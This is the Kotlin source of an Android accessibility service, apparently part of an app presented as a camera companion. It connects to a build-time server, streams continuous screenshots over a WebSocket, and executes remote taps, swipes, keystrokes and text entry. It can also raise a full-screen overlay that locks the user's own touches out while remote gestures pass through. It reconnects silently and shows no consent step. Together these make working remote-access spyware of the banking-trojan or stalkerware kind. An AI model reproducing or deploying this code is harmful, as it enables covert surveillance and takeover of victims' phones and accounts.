package com.artem.cameracompanion

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.Display
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import okhttp3.*
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class ControlService : AccessibilityService() {

    private var wsControl: WebSocket? = null
    private var wsScreen: WebSocket? = null
    private val ctrlHandler = Handler(Looper.getMainLooper())
    private val screenHandler = Handler(Looper.getMainLooper())
    private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
    private var screenLoopRunning = false
    private var lastScreenFrame = 0L
    private var overlayView: View? = null
    private var overlayParams: WindowManager.LayoutParams? = null

    private val serverBase: String get() {
        var host = BuildConfig.DEFAULT_SERVER.trim()
        if (host.isEmpty()) return ""
        host = host.removePrefix("http://").removePrefix("ws://")
        if (!host.contains(":")) host = "$host:80"
        return "ws://$host"
    }

    override fun onServiceConnected() {
        connectControlWs()
        connectScreenWs()
    }

    // ── Control WebSocket ──────────────────────────────────────────────────

    private fun connectControlWs() {
        val base = serverBase
        if (base.isEmpty()) return
        val model = Uri.encode(Build.MODEL ?: "Android")
        http.newWebSocket(Request.Builder().url("$base/control?role=phone&model=$model").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsControl = ws }
                override fun onMessage(ws: WebSocket, text: String) {
                    try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsControl = null; ctrlHandler.postDelayed({ connectControlWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsControl = null; ctrlHandler.postDelayed({ connectControlWs() }, 5000)
                }
            })
    }

    // ── Screen WebSocket + takeScreenshot loop ─────────────────────────────

    private fun connectScreenWs() {
        val base = serverBase
        if (base.isEmpty()) return
        val model = Uri.encode(Build.MODEL ?: "Android")
        http.newWebSocket(Request.Builder().url("$base/screen?role=phone&model=$model").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsScreen = ws; startScreenLoop() }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsScreen = null; stopScreenLoop()
                    screenHandler.postDelayed({ connectScreenWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsScreen = null; stopScreenLoop()
                    screenHandler.postDelayed({ connectScreenWs() }, 5000)
                }
            })
    }

    private fun startScreenLoop() {
        if (screenLoopRunning) return
        screenLoopRunning = true
        scheduleScreenshot()
    }

    private fun stopScreenLoop() {
        screenLoopRunning = false
        screenHandler.removeCallbacksAndMessages(null)
    }

    @SuppressLint("NewApi")
    private fun scheduleScreenshot() {
        if (!screenLoopRunning) return
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return
        val ws = wsScreen ?: return
        val now = System.currentTimeMillis()
        if (now - lastScreenFrame < 150) { screenHandler.postDelayed({ scheduleScreenshot() }, 50); return }
        if (ws.queueSize() > 512 * 1024) { screenHandler.postDelayed({ scheduleScreenshot() }, 100); return }

        takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
            override fun onSuccess(screenshot: AccessibilityService.ScreenCapture) {
                try {
                    val hw = screenshot.hardwareBitmap
                    val scale = minOf(1f, 720f / hw.width)
                    val sw = (hw.width * scale).toInt()
                    val sh = (hw.height * scale).toInt()
                    val soft = hw.copy(Bitmap.Config.ARGB_8888, false)
                    val bmp = if (scale < 1f) {
                        Bitmap.createScaledBitmap(soft, sw, sh, true).also { soft.recycle() }
                    } else soft
                    val out = ByteArrayOutputStream()
                    bmp.compress(Bitmap.CompressFormat.JPEG, 60, out)
                    bmp.recycle()
                    wsScreen?.send(out.toByteArray().toByteString())
                    lastScreenFrame = System.currentTimeMillis()
                } catch (_: Exception) {
                } finally {
                    try { screenshot.hardwareBitmap.recycle() } catch (_: Exception) {}
                }
                if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 100)
            }
            override fun onFailure(errorCode: Int) {
                if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 500)
            }
        })
    }

    // ── Touch-block overlay ────────────────────────────────────────────────

    private fun showTouchBlockOverlay() {
        if (overlayView != null) return
        if (!Settings.canDrawOverlays(this)) return
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        overlayParams = params
        val view = View(this)
        overlayView = view
        ctrlHandler.post {
            try { (getSystemService(WINDOW_SERVICE) as WindowManager).addView(view, params) }
            catch (_: Exception) { overlayView = null; overlayParams = null }
        }
    }

    private fun hideTouchBlockOverlay() {
        val v = overlayView ?: return
        overlayView = null
        overlayParams = null
        ctrlHandler.post {
            try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
        }
    }

    // Temporarily makes overlay pass-through while dispatching remote gesture
    private fun dispatchGestureWithOverlay(gesture: GestureDescription) {
        val v = overlayView
        val p = overlayParams
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        ctrlHandler.post {
            if (v != null && p != null) {
                p.flags = p.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                try { wm.updateViewLayout(v, p) } catch (_: Exception) {}
            }
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription) {
                    if (v == null || p == null) return
                    p.flags = p.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
                    ctrlHandler.post { try { wm.updateViewLayout(v, p) } catch (_: Exception) {} }
                }
                override fun onCancelled(gestureDescription: GestureDescription) = onCompleted(gestureDescription)
            }, ctrlHandler)
        }
    }

    // ── Command dispatch ───────────────────────────────────────────────────

    private fun handleMessage(msg: JSONObject) {
        when (msg.getString("type")) {
            "tap"  -> performTap(msg.getDouble("x").toFloat(), msg.getDouble("y").toFloat())
            "swipe" -> performSwipe(
                msg.getDouble("x1").toFloat(), msg.getDouble("y1").toFloat(),
                msg.getDouble("x2").toFloat(), msg.getDouble("y2").toFloat(),
                msg.optLong("ms", 200)
            )
            "key"        -> performKey(msg.optString("name", ""))
            "text"       -> typeText(msg.optString("text", ""))
            "cam-switch" -> {
                val cam = msg.optString("cam", "back")
                startService(Intent(this, StreamingService::class.java)
                    .setAction("SWITCH_CAM").putExtra("cam", cam))
            }
            "touch-lock" -> {
                val lock = msg.optBoolean("locked", false)
                ctrlHandler.post { if (lock) showTouchBlockOverlay() else hideTouchBlockOverlay() }
            }
        }
    }

    // ── Gesture helpers ────────────────────────────────────────────────────

    private fun screenSize(): Pair<Int, Int> {
        val dm = getSystemService(DISPLAY_SERVICE) as DisplayManager
        val display = dm.getDisplay(Display.DEFAULT_DISPLAY) ?: return Pair(1080, 1920)
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        return Pair(metrics.widthPixels, metrics.heightPixels)
    }

    private fun performTap(nx: Float, ny: Float) {
        val (w, h) = screenSize()
        val path = Path().apply { moveTo(nx * w, ny * h) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 100)
        dispatchGestureWithOverlay(GestureDescription.Builder().addStroke(stroke).build())
    }

    private fun performSwipe(nx1: Float, ny1: Float, nx2: Float, ny2: Float, ms: Long) {
        val (w, h) = screenSize()
        val path = Path().apply { moveTo(nx1 * w, ny1 * h); lineTo(nx2 * w, ny2 * h) }
        val stroke = GestureDescription.StrokeDescription(path, 0, maxOf(1L, ms))
        dispatchGestureWithOverlay(GestureDescription.Builder().addStroke(stroke).build())
    }

    private fun performKey(name: String) {
        val audio by lazy { getSystemService(AUDIO_SERVICE) as AudioManager }
        when (name) {
            "BACK"    -> performGlobalAction(GLOBAL_ACTION_BACK)
            "HOME"    -> performGlobalAction(GLOBAL_ACTION_HOME)
            "RECENTS" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "NOTIFICATIONS", "NOTIFS" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "POWER"   -> performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
            "VOLUME_UP"   -> audio.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
            "VOLUME_DOWN" -> audio.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
            "ENTER"   -> typeText("\n")
            "DEL"     -> deleteLastChar()
        }
    }

    private fun typeText(text: String) {
        val node = rootInActiveWindow ?: return
        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT) ?: node
        val args = Bundle()
        args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        try { focused.recycle() } catch (_: Exception) {}
        try { node.recycle() } catch (_: Exception) {}
    }

    private fun deleteLastChar() {
        val node = rootInActiveWindow ?: return
        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val cur = focused.text?.toString() ?: ""
            if (cur.isNotEmpty()) {
                val args = Bundle()
                args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur.dropLast(1))
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            }
            try { focused.recycle() } catch (_: Exception) {}
        }
        try { node.recycle() } catch (_: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    override fun onUnbind(intent: Intent?): Boolean {
        stopScreenLoop()
        hideTouchBlockOverlay()
        wsControl?.close(1000, "stopped"); wsControl = null
        wsScreen?.close(1000, "stopped");  wsScreen = null
        return super.onUnbind(intent)
    }
}
